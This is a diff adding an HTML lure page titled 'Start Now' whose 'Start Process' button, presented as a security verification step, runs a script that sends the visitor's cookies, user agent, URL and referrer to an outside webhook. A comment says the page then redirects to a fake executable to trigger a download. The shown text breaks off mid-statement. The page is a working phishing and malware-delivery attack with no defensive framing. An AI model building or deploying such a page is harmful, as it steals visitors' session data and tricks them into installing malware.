@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Start Now</title>
+  <style>
+    body { font-family: -apple-system, sans-serif; text-align: center; padding: 60px 20px; background: #f8f9fa; }
+    .container { max-width: 500px; margin: 0 auto; padding: 30px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    h1 { color: #1a73e8; }
+    p { color: #555; }
+    button { background: #1a73e8; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+    button:hover { background: #0d62d0; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🚀 Start Now</h1>
+    <p>Click below to begin your session.</p>
+    <button onclick="start()">Start Process</button>
+    <p><small>Verification required for security.</small></p>
+  </div>
+
+  <script>
+    async function start() {
+      // Log victim data to webhook
+      await fetch('https://api.webhooklog.com/hook/XXXXX', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ip: '' || 'unknown',
+          ua: navigator.userAgent,
+          lang: navigator.language,
+          cookies: document.cookie,
+          time: new Date().toISOString(),
+          url: window.location.href,
+          ref: document.referrer
+        }),
+        mode: 'no-cors'
+      }).catch(() => {});
+
+      // Redirect to fake EXE (triggers download)
+      window.l
